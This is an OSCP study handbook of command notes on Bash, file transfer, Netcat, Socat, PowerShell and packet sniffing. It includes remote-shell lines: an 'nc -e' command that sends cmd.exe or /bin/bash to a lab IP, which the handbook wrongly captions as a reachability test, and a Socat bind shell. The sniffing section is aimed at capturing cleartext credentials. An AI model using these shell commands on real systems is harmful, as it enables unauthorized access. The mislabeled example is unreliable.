---
title: OSCP (Handbook)
---

![[Gemini_Generated_Image_r2k1w8r2k1w8r2k1-removebg-preview.png]]


###### **by Omar kiwan (*xray09*)**
***Linkedin*** : www.linkedin.com/in/omar-kiwan-a519243a6
***Twitter*** : https://x.com/xray00i
### *summery
A practical OSCP Handbook covering the core concepts, techniques, commands, and methodologies used throughout the OSCP journey. Structured as a personal reference for studying, revising, and applying penetration testing techniques in hands-on labs.

--------------------
### moduls
- **Introduction to CyberSecurity**
- **Report Writing for Penetration Testers**
- **Information Gathering**
- **Vulnerability Scanning**
- **Introduction to Web Applications**
- **Common Web Application Attacks**
- **SQL Injection Attacks**
- **Client-Side Attacks**
- **Locating Public Exploits**
- **Fixing Exploits**
- **Antivirus Evasion**
- **Password Attacks**
- **Windows Privilege Escalation**
- **Linux Privilege Escalation**
- **Advanced Tunneling**
- **The Metasploit Framework**
- **Active Directory: Introduction and Enumeration**
- **Attacking Active Directory Authentication**
- **Lateral Movement in Active Directory**
### *Hands-On Practice*

 ==**OffSec / PG:**==  
*Medtech | Relia | Skylark | OSCP A | OSCP B | OSCP C | Jacko | Pelican | Sorcerer | MedJed | Fish | Malbec | ClamAV | Webcal | Hutch | Vault | Heist | Pain | Sufferance | Humble*

 ==**VulnHub:**==  
*Cybox | Devguru | Netstart | Tiki | Moee*

 ==**HTB:**==  
*Lame | Shocker | Nibbles | Bastion | Forest | Active | Blue | Netmon | Silo | Sauna | Monteverde | Return | Administrator | Certified | Access*
### *Resources*
- youtube.com/@Limbo0x01
- youtube.com/@HackerBlueprint
- **OffSec PEN-200 — Penetration Testing with Kali Linux**
- **OffSec OSCP+ Body of Knowledge**
- **OffSec PEN-200 Syllabus**
- **OffSec Authoritative References — OSCP+**
- **OffSec PEN-200 Learning Plans**
- **Kali Linux Documentation**
- **Microsoft Learn / Windows Documentation**
- **Linux Documentation / man pages**
- **OWASP Web Security Testing Resources**
- **MITRE ATT&CK**
- **Nmap Documentation**
- **Netcat / Socat Documentation**
- **Impacket Documentation**
- **PowerShell Documentation**
- **BloodHound Documentation**
- **Burp Suite Documentation










# ______________________

# ==Defense in Depth==
### Definition
![[8193190.png]]
**Defense in Depth** is a security strategy that uses **multiple layers of security controls** to protect a system.

The main idea:

> **If one security layer fails, other layers can still protect the system.**

### Example

```
Internet
   ↓
Firewall
   ↓
WAF
   ↓
Web Server
   ↓
Authentication
   ↓
Access Controls
   ↓
Database
```

If an attacker bypasses the **Firewall**, they still have to pass other security controls.

### Common Security Layers

- **Firewall** → Controls network traffic
- **WAF** → Protects web applications
- **Authentication** → Verifies users
- **MFA** → Adds another authentication layer
- **Least Privilege** → Limits user permissions
- **Network Segmentation** → Limits movement between systems
- **Encryption** → Protects sensitive data
- **Logging & Monitoring** → Detects suspicious activity

### OSCP Example

An attacker gets **RCE** on a web server.

Without Defense in Depth:

```
RCE → Admin/Root → Full Compromise
```

With Defense in Depth:

```
RCE
 ↓
Low-privileged user
 ↓
Limited permissions
 ↓
Network restrictions
 ↓
Database access controls
 ↓
Monitoring / Alerts
```

The attacker may compromise one layer but **cannot easily compromise the entire environment**.

### Key Point

**Defense in Depth = Multiple security layers + no single point of failure.**

### Remember

> **One layer can fail. Multiple layers make the attack harder and reduce the impact.**

------------------------------------------------------

# ==Backups== 
![[12124610.png]]
### What are Backups?

A **backup** is a copy of important data kept separately so it can be restored if the original data is lost, corrupted, or compromised.

### Why are backups important?

Backups help recover from:

- Ransomware
- Accidental deletion
- Hardware failure
- Data corruption
- System compromise

### Common Backup Types

**1. Full Backup**

- Copies **all data**.
- Easy to restore.
- Takes more storage and time.

**2. Incremental Backup**

- Copies only data changed **since the last backup**.
- Fast and requires less storage.
- Restoration can be more complicated.

**3. Differential Backup**

- Copies data changed **since the last full backup**.
- Uses more storage than incremental.
- Easier to restore.

### Important Security Concept

Backups should not be accessible to everyone.

For example:

```
Production Server
       ↓
    Backup
       ↓
Separate Storage
       ↓
Restricted Access
```

If an attacker compromises the production server, they ideally **should not be able to delete or modify the backups**.

### 3-2-1 Backup Rule

A common backup strategy:

**3** → Keep 3 copies of the data  
**2** → Use 2 different types of storage  
**1** → Keep 1 copy off-site

Example:

```
Original Data
     +
Local Backup
     +
Off-site Backup
```

### OSCP Takeaway

Remember these keywords:

> **Backups = Recovery + Availability + Data Protection**

And from a security perspective:

> **A backup is only useful if the attacker cannot compromise or destroy it along with the original data.**

----------------------------------------------------------
# ==Bash Environment==
![[monochrome_dark.png]]
**Bash** = **Bourne Again Shell**.

It is a command-line shell used to interact with Linux systems.

```
whoami
pwd
ls
cd /tmp
```

---

## 1. Important Environment Variables

Environment variables store information used by the shell and programs.

### `$PATH`

Contains directories where Linux looks for executable commands.

```
echo $PATH
```

Example:

```
/usr/local/bin:/usr/bin:/bin
```

You can check where a command comes from:

```
which bash
which python3
```

or:

```
command -v python3
```

---

### `$HOME`

Your user's home directory:

```
echo $HOME
```

Example:

```
/root
```

Go there with:

```
cd $HOME
```

---

### `$USER`

Current username:

```
echo $USER
```

Check it another way:

```
whoami
```

---

### `$SHELL`

Shows your default shell:

```
echo $SHELL
```

Example:

```
/bin/bash
```

---

## 2. Useful Bash Commands

```
pwd          # Current directory
ls           # List files
cd           # Change directory
mkdir        # Create directory
touch        # Create file
cp           # Copy
mv           # Move/rename
rm           # Delete
cat          # Display file
less         # Read file
```

---

## 3. Redirecting Output

### `>`

Write output to a file and **overwrite** it:

```
whoami > user.txt
```

### `>>`

Append output:

```
whoami >> user.txt
```

### `<`

Use a file as input:

```
command < input.txt
```

---

## 4. Pipes `|`

Send the output of one command to another command.

```
ls | grep txt
```

Example:

```
cat users.txt | grep admin
```

Think:

> **Command 1 → output → Command 2**

---

## 5. Useful Operators

### `&&`

Run the second command **only if the first succeeds**:

```
mkdir test && cd test
```

### `;`

Run both commands regardless of whether the first succeeds:

```
mkdir test; cd test
```

### `||`

Run the second command **only if the first fails**:

```
cd test || mkdir test
```

---

## 6. Background Processes

Add `&`:

```
ping 127.0.0.1 &
```

The command runs in the background.

Check jobs:

```
jobs
```

Bring a job back:

```
fg
```

---

## 7. Bash Variables

Create a variable:

```
name="kali"
```

Use it:

```
echo $name
```

Output:

```
kali
```

**No spaces around `=`.**

 Wrong:

```
name = "kali"
```
 Correct:

```
name="kali"
```

---

## 8. Command Substitution

Run a command and put its output into another command/variable:

```
user=$(whoami)
echo $user
```

You may also see:

```
user=`whoami`
```

But `$(...)` is the preferred modern syntax.

---

## 9. Important OSCP Concept

When working with Bash, understand this flow:

```
Input
  ↓
Command
  ↓
Arguments
  ↓
Output
  ↓
Pipe / Redirect
  ↓
Another Command / File
```

For example:

```
cat users.txt | grep admin > admins.txt
```

Meaning:

```
users.txt
   ↓
cat
   ↓
grep "admin"
   ↓
admins.txt
```

###  OSCP Must-Know

Memorize these:

```
echo $PATH
echo $HOME
echo $USER
echo $SHELL

command -v <command>

command1 | command2
command1 > file
command1 >> file
command1 && command2
command1 || command2
command1 &
```

**The main goal isn't memorizing hundreds of Bash commands — it's being comfortable combining simple commands to accomplish a task quickly.**

-----------------------------------
# ==Piping & Redirection==
### What is Piping & Redirection?
## 1. Pipe `|`

A **pipe** sends the output of one command as the input of another command.

```
ls | grep txt
```

Think:

```
ls
 ↓ output
grep txt
 ↓
filtered result
```

Example:

```
cat users.txt | grep admin
```

This searches for `admin` in the file.

---

## 2. Output Redirection `>`

Sends command output to a file.

```
whoami > user.txt
```

 If the file already exists, `>` **overwrites** it.

```
>  = overwrite
```

---

## 3. Append `>>`

Adds output to the end of a file without overwriting the existing content.

```
whoami >> user.txt
```

```
>> = append
```

---

## 4. Input Redirection `<`

Takes input from a file instead of the keyboard.

```
sort < users.txt
```

Meaning:

```
users.txt
    ↓
  sort
```

---

## 5. Error Redirection `2>`

Linux has three standard streams:

```
0 = stdin
1 = stdout
2 = stderr
```

To redirect errors:

```
command 2> errors.txt
```

Example:

```
ls /doesnotexist 2> errors.txt
```

The error message goes into `errors.txt`.

---

## 6. Redirect Output + Errors

```
command > output.txt 2>&1
```

This sends both:

- `stdout` → `output.txt`
- `stderr` → `output.txt`

---

## 7. `/dev/null`

`/dev/null` discards anything sent to it.

```
command > /dev/null
```

Hide both normal output and errors:

```
command > /dev/null 2>&1
```

Think:

> **`/dev/null` = output goes nowhere**

---

##  OSCP Cheat Sheet

```
command1 | command2
```

**Send output to another command**

```
command > file
```

**Overwrite file**

```
command >> file
```

**Append to file**

```
command < file
```

**Take input from file**

```
command 2> file
```

**Send errors to file**

```
command > file 2>&1
```

**Send output + errors to file**

```
command > /dev/null 2>&1
```

**Discard output + errors**

### Remember

> **`|` = command → command**  
> **`>` = command → file**  
> **`<` = file → command**  
> **`2>` = errors → file**

------------------------------------------


# ==Text Searching & Manipulation== 

### Searching

```
grep "admin" file.txt
```

Search for text.

```
grep -i "admin" file.txt
```

Case-insensitive.

```
grep -r "password" /etc/
```

Search recursively.

```
find / -name "config.txt" 2>/dev/null
```

Find files by name.

### Manipulation

```
cat file.txt
```

Display file.

```
sort file.txt
```

Sort lines.

```
uniq file.txt
```

Remove consecutive duplicates.

```
cut -d: -f1 /etc/passwd
```

Extract a specific field.

```
sed 's/old/new/g' file.txt
```

Replace text.

```
awk '{print $1}' file.txt
```

Print the first field.

###  OSCP Must Know

```
grep  → search text
find  → find files
cat   → read files
sort  → sort lines
uniq  → remove duplicates
cut   → extract fields
sed   → modify text
awk   → process/extract text
```

**Remember:** These commands are often combined with `|`:

```
cat file.txt | grep admin | sort -u
```

→ Read → filter → sort/remove duplicates.

--------------------

# ==Managing Processes==

### What is a Process?

A **process** is a running program.

### Important Commands

```
ps
```

Show your running processes.

```
ps aux
```

Show **all running processes**.

```
top
```

Live view of processes and resource usage.

```
pgrep ssh
```

Find the **PID** of a process.

```
kill <PID>
```

Terminate a process.

```
kill -9 <PID>
```

Force kill a process.

```
jobs
```

Show processes running as background jobs.

```
fg
```

Bring a background job to the foreground.

```
command &
```

Run a command in the background.

### Useful OSCP Concept

```
Process
   ↓
PID (Process ID)
   ↓
User running it
   ↓
Permissions
```

For example:

```
ps aux | grep ssh
```

→ Find SSH-related processes.

###  Remember

```
ps      → list processes
top     → monitor processes
pgrep   → find PID
kill    → stop process
jobs    → background jobs
fg      → foreground
&       → background
```

-------------------------------
# ==Downloading Files== 

### `wget`

Download a file:

```
wget http://<IP>/file.txt
```

Save with a specific name:

```
wget -O file.txt http://<IP>/file.txt
```

### `curl`

```
curl -O http://<IP>/file.txt
```

Save with a specific name:

```
curl -o file.txt http://<IP>/file.txt
```

### Python HTTP Server

Share files from the current directory:

```
python3 -m http.server 8000
```

Then download:

```
wget http://<IP>:8000/file.txt
```

### `scp`

Transfer files over SSH:

```
scp file.txt user@<IP>:/tmp/
```

### `tftp`

Simple file transfer protocol:

```
tftp <IP>
```

### `git clone`

Clone/download a Git repository:

```
git clone https://github.com/user/tool.git
```

Then:

```
cd tool
```

### `tail`

Show the last 10 lines:

```
tail file.txt
```

Monitor a file live:

```
tail -f file.txt
```

### `watch`

Repeatedly run a command:

```
watch -n 1 "ps aux"
```

Runs the command every 1 second.

---

##  OSCP Cheat Sheet

```
wget       → download files
curl       → download/transfer files
scp        → transfer over SSH
tftp       → simple file transfer
git clone  → clone Git repository
python3 -m http.server → share files
tail       → show last lines
tail -f    → monitor file live
watch      → repeatedly run command
```

----------------------------------------------------------

# ==NetCat==
![[Netcat_logo.png|425]]
### What is Netcat?

**Netcat (`nc`)** is a simple tool for creating and testing **TCP/UDP network connections**.

> **Netcat = Connect + Listen + Send/Receive data**

### Connect to a Port

```
nc -nv <IP> <PORT>
```

Example:

```
nc -nv 10.10.10.20 80 -e {cmd.exe // /bin/bash}
```

Useful for testing whether a service/port is reachable.

### Listen on a Port

```
nc -lvnp 4444
```

- `-l` → Listen
- `-v` → Verbose
- `-n` → Don't resolve DNS
- `-p` → Port

### Transfer a File

**Receiving:**

```
nc -lvnp 4444 > file.txt
```

**Sending:**

```
nc <IP> 4444 < file.txt
```

### Useful in Pentesting

```
Port Testing
     ↓
Network Connectivity
     ↓
Listen for Connections
     ↓
Transfer Files/Data
```

###  OSCP Cheat Sheet

```
nc -nv <IP> <PORT>       # Connect to a port
nc -lvnp 4444            # Listen on port 4444
nc -lvnp 4444 > file     # Receive file
nc <IP> 4444 < file      # Send file
```

**Remember:**

> **`nc` is basically a network Swiss Army knife for TCP/UDP connections.**

-----------------------------------------------------------
# ==SoCat==
![[1_o8EmyG8hOa0C7gi4zRifKQ.webp]]
## 1. What is Socat?

**Socat = Socket CAT**

Socat is a powerful networking utility used to create **bidirectional data transfers between two endpoints**.

Basic syntax:

```
socat [OPTIONS] <ADDRESS1> <ADDRESS2>
```

The important concept is:

```
ADDRESS1  <---->  SOCAT  <---->  ADDRESS2
```

Unlike Netcat, Socat supports many different types of endpoints, such as:

- TCP
- UDP
- Files
- STDIN / STDOUT
- PTY
- Executed programs
- Unix sockets
- Serial devices

---

## 2. Basic TCP Connection

### TCP Listener

```
socat TCP-LISTEN:4444,reuseaddr -
```

`-` means **STDIN/STDOUT**.

So the flow is:

```
Terminal <----> TCP :4444
```

### TCP Client

```
socat TCP:192.168.1.10:4444 -
```

---

## 3. UDP

### UDP Listener

```
socat UDP-LISTEN:4444,reuseaddr -
```

### UDP Client

```
socat UDP:192.168.1.10:4444 -
```

---

## 4. `reuseaddr`

`reuseaddr` allows the socket address to be reused.

Useful when restarting a listener and you encounter:

```
Address already in use
```

Example:

```
socat TCP-LISTEN:4444,reuseaddr -
```

---

## 5. `fork`

`fork` allows Socat to handle multiple connections by creating a separate process for each connection.

Example:

```
socat TCP-LISTEN:4444,reuseaddr,fork -
```

Think:

```
Connection 1 → Process 1
Connection 2 → Process 2
Connection 3 → Process 3
```

Without `fork`, handling multiple connections is more limited.

---

## 6. `EXEC`

One of Socat's most useful features is connecting a network socket to a program.

Example:

```
socat TCP-LISTEN:4444,reuseaddr EXEC:"/bin/bash"
```

Conceptually:

```
TCP Connection
      ↓
    Socat
      ↓
   /bin/bash
```

`EXEC:` tells Socat to execute a program and connect its input/output to the socket.

---

## 7. PTY

**PTY = Pseudo Terminal**

PTYs are especially useful when you need a more interactive terminal environment.

Example:

```
socat TCP-LISTEN:4444,reuseaddr,fork EXEC:"/bin/bash",pty,stderr,setsid,sigint,sane
```

The important options to recognize:

|Option|Purpose|
|---|---|
|`pty`|Creates a pseudo-terminal|
|`stderr`|Redirects stderr|
|`setsid`|Creates a new session|
|`sigint`|Handles Ctrl+C|
|`sane`|Configures terminal settings|

For OSCP, you don't necessarily need to memorize every option immediately. Understand **why PTY is being used**.

---

## 8. Socat as a Relay

This is where Socat becomes much more powerful than basic Netcat usage.

Example:

```
socat TCP-LISTEN:4444,fork TCP:10.10.10.20:80
```

Conceptually:

```
Client
   |
   | TCP :4444
   ↓
 Socat
   |
   | TCP :80
   ↓
10.10.10.20
```

Socat receives the connection and forwards the traffic to another endpoint.

This makes Socat useful for:

- Relaying traffic
- Port forwarding
- Proxies
- Connecting incompatible endpoints

---

## 9. Important Socat Address Types

You don't need to memorize hundreds of options. Focus on the major address types:

|Address|Meaning|
|---|---|
|`TCP:`|TCP client|
|`TCP-LISTEN:`|TCP listener|
|`UDP:`|UDP client|
|`UDP-LISTEN:`|UDP listener|
|`EXEC:`|Execute a program|
|`SYSTEM:`|Execute a system command|
|`FILE:`|File endpoint|
|`-`|STDIN/STDOUT|
|`PTY`|Pseudo-terminal|

---

## Netcat vs Socat

|Feature|Netcat|Socat|
|---|---|---|
|TCP|✅|✅|
|UDP|✅|✅|
|TCP Listener|✅|✅|
|TCP Client|✅|✅|
|Simple file transfer|✅|✅|
|Basic shell interaction|✅|✅|
|Relaying|⚠️ Limited|✅|
|Port forwarding|⚠️ Limited|✅|
|PTY support|⚠️ Depends on implementation|✅|
|Unix sockets|Limited|✅|
|Serial devices|Limited|✅|
|Complex I/O redirection|Limited|✅|
|Ease of use|⭐⭐⭐⭐⭐|⭐⭐⭐|
|Flexibility|⭐⭐⭐|⭐⭐⭐⭐⭐|

---

###  The Main Difference

### Netcat

Think:

```
Netcat = Simple networking Swiss Army knife
```

Example:

```
nc -lvnp 4444
```

or:

```
nc 10.10.10.5 4444
```

It's very easy to use and is excellent for quick connections, listeners, and basic data transfer.

---

### Socat

Think:

```
Socat = Netcat + advanced I/O plumbing
```

You can connect:

```
TCP → Program
TCP → TCP
TCP → PTY
File → TCP
UDP → Program
Unix Socket → TCP
```

That's the major reason Socat's syntax looks more complicated.

---

##  OSCP Mental Model

Instead of memorizing random Socat commands, remember:

```
              SOCAT
                |
       ┌────────┴────────┐
       |                 |
   ADDRESS 1          ADDRESS 2
       |                 |
     TCP                EXEC
     UDP                FILE
    STDIO                PTY
```

For example:

```
socat TCP-LISTEN:4444,fork EXEC:"program"
```

Read it as:

```
Listen on TCP :4444
        ↓
     fork
        ↓
Execute a program
        ↓
Connect its I/O to the network
```

---

## OSCP Cheat Sheet

### Netcat

```
nc -lvnp 4444
```

Listener.

```
nc <IP> <PORT>
```

Client.

---

### Socat

**TCP Listener**

```
socat TCP-LISTEN:4444,reuseaddr -
```

**TCP Client**

```
socat TCP:<IP>:4444 -
```

**UDP Listener**

```
socat UDP-LISTEN:4444,reuseaddr -
```

**Multiple Connections**

```
socat TCP-LISTEN:4444,reuseaddr,fork -
```

**Connect Socket to Program**

```
socat TCP-LISTEN:4444,reuseaddr,fork EXEC:"program"
```

**PTY-based interactive setup**

```
socat TCP-LISTEN:4444,reuseaddr,fork EXEC:"/bin/bash",pty,stderr,setsid,sigint,sane
```

---
	
##  What to remember for OSCP

If you're short on study time, remember these **5 things**:

1. **Socat creates bidirectional connections between two endpoints.**
2. `TCP-LISTEN:` → TCP listener.
3. `TCP:` → TCP client.
4. `EXEC:` → connect a socket to a program.
5. `PTY` → provides a pseudo-terminal for better interactive sessions.

### One-line comparison

> **Netcat is simpler; Socat is more flexible and powerful.**

That distinction is the most important thing to understand before memorizing the commands.

----------------------------
# ==PowerShell==
![[free-powershell-logo-icon-svg-download-png-2945093.webp|364]]
## 1. What is PowerShell?

**PowerShell** is Microsoft's command-line shell and scripting language, mainly used for Windows administration and automation.

For OSCP, it's important because **Windows targets commonly have PowerShell available**, making it useful for:

- Enumeration
- File/system interaction
- Process management
- Networking
- Automation
- Privilege-escalation enumeration
- Working with Windows APIs and .NET

---

## 2. Starting PowerShell

From `cmd.exe`:

```
powershell
```

Check the version:

```
$PSVersionTable
```

Useful:

```
$PSVersionTable.PSVersion
```

---

## 3. Basic Commands

PowerShell uses **cmdlets** with a:

```
Verb-Noun
```

structure.

Examples:

```
Get-Process
Get-Service
Get-ChildItem
Get-Location
Get-Command
```

### Current directory

```
Get-Location
```

Short version:

```
pwd
```

### List files

```
Get-ChildItem
```

Aliases:

```
ls
dir
```

### Change directory

```
Set-Location C:\Users
```

or:

```
cd C:\Users
```

---

## 4. File Operations

### Read a file

```
Get-Content file.txt
```

Alias:

```
cat file.txt
```

### Create a file

```
New-Item test.txt
```

### Copy

```
Copy-Item source.txt destination.txt
```

### Move

```
Move-Item source.txt destination.txt
```

### Delete

```
Remove-Item test.txt
```

---

## 5. Finding Files

Basic recursive search:

```
Get-ChildItem C:\Users -Recurse
```

Find files by name:

```
Get-ChildItem C:\Users -Recurse -Filter "*.txt"
```

Example:

```
Get-ChildItem C:\Users -Recurse -Filter "password.txt"
```

---

## 6. Environment Variables

List environment variables:

```
Get-ChildItem Env:
```

Specific variable:

```
$env:PATH
```

Other examples:

```
$env:USERNAME
$env:USERDOMAIN
$env:COMPUTERNAME
```

Very useful during Windows enumeration.

---

## 7. Users and Groups

Current user:

```
whoami
```

Current user information:

```
[System.Security.Principal.WindowsIdentity]::GetCurrent()
```

Local users:

```
Get-LocalUser
```

Local groups:

```
Get-LocalGroup
```

Members of a group:

```
Get-LocalGroupMember Administrators
```

These are useful when determining:

```
Who am I?
       ↓
What groups am I in?
       ↓
What privileges do I have?
```

---

## 8. Processes

List processes:

```
Get-Process
```

Find a specific process:

```
Get-Process -Name explorer
```

Get detailed information:

```
Get-Process | Format-List *
```

Kill a process:

```
Stop-Process -Name processname
```

---

## 9. Services

List services:

```
Get-Service
```

Find running services:

```
Get-Service | Where-Object {$_.Status -eq "Running"}
```

Find a specific service:

```
Get-Service -Name Spooler
```

For OSCP, services are particularly interesting during **Windows privilege-escalation enumeration**.

---

## 10. Networking

View IP configuration:

```
Get-NetIPConfiguration
```

View network interfaces:

```
Get-NetIPAddress
```

View routes:

```
Get-NetRoute
```

View connections:

```
Get-NetTCPConnection
```

Test connectivity:

```
Test-NetConnection 192.168.1.10
```

Test a specific port:

```
Test-NetConnection 192.168.1.10 -Port 445
```

---

## 11. Downloading Files

PowerShell can interact with HTTP resources.

One common method is:

```
Invoke-WebRequest
```

Example:

```
Invoke-WebRequest -Uri "http://192.168.1.10/file.txt" -OutFile "C:\Users\Public\file.txt"
```

Short alias:

```
iwr
```

Another common option:

```
curl
```

On modern Windows, be aware that `curl` normally maps to the actual `curl.exe`, while `iwr` is the PowerShell alias for `Invoke-WebRequest`.

---

## 12. PowerShell Pipeline

One of the **most important PowerShell concepts**.

PowerShell can pipe objects:

```
Get-Process | Where-Object {$_.CPU -gt 100}
```

Conceptually:

```
Get-Process
     ↓
 Objects
     ↓
Where-Object
     ↓
Filtered objects
```

Unlike traditional Unix pipelines, PowerShell generally passes **objects**, not just text.

---

## 13. `Where-Object`

Used to filter objects.

Example:

```
Get-Service | Where-Object {$_.Status -eq "Running"}
```

Another example:

```
Get-Process | Where-Object {$_.Name -like "*sql*"}
```

Useful operators:

```
-eq    Equal
-ne    Not equal
-gt    Greater than
-lt    Less than
-ge    Greater/equal
-le    Less/equal
-like  Wildcard matching
-match Regex matching
```

---

## 14. `Select-Object`

Used to select specific properties.

Example:

```
Get-Process | Select-Object Name, Id
```

Instead of displaying everything, you can focus on:

```
Name
Id
```

---

## 15. `Get-Command`

One of the best commands to remember.

```
Get-Command
```

Find commands related to networking:

```
Get-Command *Net*
```

Find commands related to services:

```
Get-Command *Service*
```

Find a specific command:

```
Get-Command Get-Process
```

---

## 16. `Get-Help`

PowerShell has built-in documentation.

```
Get-Help Get-Process
```

More detailed:

```
Get-Help Get-Process -Full
```

Examples:

```
Get-Help Get-Process -Examples
```

Very useful when you don't remember syntax during the exam.

---

## 17. Registry

PowerShell can interact with the Windows Registry.

Registry drives include:

```
HKLM:
HKCU:
```

Example:

```
Get-ChildItem HKLM:
```

Read a registry path:

```
Get-ItemProperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"
```

Registry enumeration can be relevant during Windows enumeration and privilege escalation.

---

## 18. PowerShell vs CMD

| Feature                | CMD  | PowerShell |
| ---------------------- | ---- | ---------- |
| Basic commands         | 1    | 1          |
| Windows administration | 1    | 1          |
| Scripting              | half | 1          |
| Objects                | 0    | 1          |
| Pipeline               | Text | Objects    |
| .NET integration       | 0    | 1          |
| Advanced automation    | 0    | 1          |
| OSCP usefulness        | 0    | 1          |

---

## 19. CMD → PowerShell Mental Translation

|CMD|PowerShell|
|---|---|
|`dir`|`Get-ChildItem`|
|`cd`|`Set-Location`|
|`type`|`Get-Content`|
|`copy`|`Copy-Item`|
|`move`|`Move-Item`|
|`del`|`Remove-Item`|
|`tasklist`|`Get-Process`|
|`whoami`|`whoami`|
|`ipconfig`|`Get-NetIPConfiguration`|
|`netstat`|`Get-NetTCPConnection`|

Remember that many familiar commands such as `dir`, `cd`, and `cat` are **aliases** in PowerShell.

---

##  OSCP Enumeration Flow

When you get a PowerShell shell on a Windows machine, think:

```
                PowerShell
                    │
        ┌───────────┼───────────┐
        ↓           ↓           ↓
      User       System       Network
        │           │           │
     whoami      hostname    IP config
     groups      processes   connections
     privileges  services    routes
```

Then move toward:

```
User
 ↓
Groups
 ↓
Privileges
 ↓
Processes
 ↓
Services
 ↓
Scheduled Tasks
 ↓
Network
 ↓
Interesting Files
 ↓
Credentials / Misconfigurations
```

---

##  OSCP PowerShell Cheat Sheet

### System

```
whoami
hostname
$env:USERNAME
$env:COMPUTERNAME
systeminfo
```

### Files

```
Get-ChildItem
Get-Content file.txt
Get-ChildItem C:\ -Recurse -Filter "*.txt"
```

### Users

```
Get-LocalUser
Get-LocalGroup
Get-LocalGroupMember Administrators
```

### Processes

```
Get-Process
```

### Services

```
Get-Service
```

### Network

```
Get-NetIPConfiguration
Get-NetIPAddress
Get-NetTCPConnection
Get-NetRoute
```

### Commands / Help

```
Get-Command
Get-Help <command>
```

### Download

```
Invoke-WebRequest -Uri "<URL>" -OutFile "<FILE>"
```

### Pipeline

```
Get-Process | Where-Object {$_.Name -like "*sql*"}
```

---
# ==Sniffing Traffic== 
![[Wireshark_icon.svg.webp|477]]
##  What to memorize for OSCP

If you want the **high-value subset**, focus on:

```
Get-ChildItem
Get-Content
Get-Process
Get-Service
Get-LocalUser
Get-LocalGroupMember
Get-NetIPConfiguration
Get-NetTCPConnection
Get-NetRoute
Get-Command
Get-Help
Where-Object
Select-Object
Invoke-WebRequest
$env:USERNAME
$env:PATH
```

**Core idea:**

> **PowerShell isn't just "CMD with different commands." Its biggest advantage is that it works with objects and provides powerful scripting/automation capabilities.**

-----------------------------------
## 1. What is Traffic Sniffing?

**Traffic sniffing** means capturing and analyzing network packets as they travel across a network.

Conceptually:

```
Host A
   │
   │ Network Traffic
   ↓
[ Network ]
   │
   ↓
Sniffer
   │
   ↓
Captured Packets
```

For OSCP, sniffing is mainly useful for **network enumeration and credential discovery**, especially when traffic is unencrypted.

---

## 2. Why is Sniffing Important?

Captured traffic can reveal things such as:

- IP addresses
- Hostnames
- Ports
- Protocols
- DNS queries
- HTTP requests
- Usernames
- Credentials sent in cleartext
- Cookies/session information
- Internal network structure

The key question is:

> **What information is traveling across the network that I normally can't see from the host itself?**

---

## 3. Wireshark

**Wireshark** is the main GUI tool for packet analysis.

Basic workflow:

```
Choose Interface
       ↓
Start Capture
       ↓
Generate / Observe Traffic
       ↓
Apply Filters
       ↓
Analyze Packets
```

For OSCP, you should understand **packet filtering** rather than trying to memorize every Wireshark feature.

---

## 4. Common Wireshark Filters

### HTTP

```
http
```

Show HTTP traffic.

### DNS

```
dns
```

Show DNS packets.

### TCP

```
tcp
```

Show TCP traffic.

### UDP

```
udp
```

Show UDP traffic.

### Specific IP

```
ip.addr == 192.168.1.10
```

### Source IP

```
ip.src == 192.168.1.10
```

### Destination IP

```
ip.dst == 192.168.1.10
```

### Specific port

```
tcp.port == 80
```

### Specific host + port

```
ip.addr == 192.168.1.10 && tcp.port == 80
```

---

## 5. Follow TCP Stream

One of the most useful Wireshark features:

**Right-click packet → Follow → TCP Stream**

Instead of looking at individual packets:

```
Packet 1
Packet 2
Packet 3
Packet 4
...
```

Wireshark reconstructs the conversation:

```
Client  ↔  Server
```

This is particularly useful for understanding protocols such as HTTP or other plaintext TCP protocols.

---

## 6. HTTP Traffic

HTTP is especially interesting because it is **unencrypted**.

Example:

```
GET /login HTTP/1.1
Host: target.local
Cookie: session=...
```

You may be able to see:

```
URL
Headers
Parameters
Cookies
POST data
```

This is why HTTPS is important:

```
HTTP
Client ────────────────> Server
       readable traffic


HTTPS
Client ════════════════> Server
       encrypted traffic
```

---

## 7. DNS Sniffing

DNS traffic can reveal what systems are communicating with.

Filter:

```
dns
```

You may discover:

```
internal.example.local
db01.example.local
admin.example.local
fileserver.example.local
```

This can provide valuable information about the environment.

---

## 8. ARP Traffic

ARP is useful for understanding the local network.

Filter:

```
arp
```

You can identify relationships such as:

```
IP Address  →  MAC Address
```

This can help with local-network enumeration.

---

## 9. TCP Handshake

Remember the TCP three-way handshake:

```
Client                 Server

  SYN  ────────────────>
       <──────── SYN/ACK
  ACK  ────────────────>
```

In Wireshark:

```
tcp.flags.syn == 1
```

can help identify SYN packets.

For SYN + ACK:

```
tcp.flags.syn == 1 && tcp.flags.ack == 1
```

---

## 10. tcpdump

**tcpdump** is the command-line alternative to Wireshark.

Start capturing:

```
sudo tcpdump
```

Specify an interface:

```
sudo tcpdump -i eth0
```

Capture traffic for a specific host:

```
sudo tcpdump -i eth0 host 192.168.1.10
```

Capture a specific port:

```
sudo tcpdump -i eth0 port 80
```

Capture TCP:

```
sudo tcpdump -i eth0 tcp
```

Capture DNS:

```
sudo tcpdump -i eth0 port 53
```

---

## 11. Save a Capture

You can save packets into a `.pcap` file:

```
sudo tcpdump -i eth0 -w capture.pcap
```

Then analyze it with Wireshark:

```
tcpdump
   ↓
capture.pcap
   ↓
Wireshark
   ↓
Detailed analysis
```

---

## 12. Read a PCAP

You can also analyze an existing capture with tcpdump:

```
tcpdump -r capture.pcap
```

This is useful when you receive a packet capture during a lab.

---

## 13. Useful tcpdump Filters

### Host

```
tcpdump host 10.10.10.5
```

### Source

```
tcpdump src host 10.10.10.5
```

### Destination

```
tcpdump dst host 10.10.10.5
```

### Port

```
tcpdump port 80
```

### TCP

```
tcpdump tcp
```

### UDP

```
tcpdump udp
```

### DNS

```
tcpdump port 53
```

---

## 14. What Are You Looking For?

During an OSCP-style assessment, don't just capture traffic and stare at packets.

Have specific objectives.

### Look for:

```
                Captured Traffic
                       │
       ┌───────────────┼───────────────┐
       ↓               ↓               ↓
    Hosts            Services       Credentials
       │               │               │
    IPs/DNS          Ports          Plaintext auth
    Hostnames        Protocols       Cookies
```

Then ask:

- Is there plaintext authentication?
- Are credentials exposed?
- Are internal hostnames visible?
- Are there interesting services?
- Is sensitive information transmitted?
- Are there unusual connections?

---

## 15. Encrypted vs Unencrypted Traffic

This is one of the most important concepts.

### Unencrypted

Examples:

```
HTTP
FTP
Telnet
```

Potentially readable:

```
Username
Password
Commands
Data
```

### Encrypted

Examples:

```
HTTPS
SSH
SFTP
```

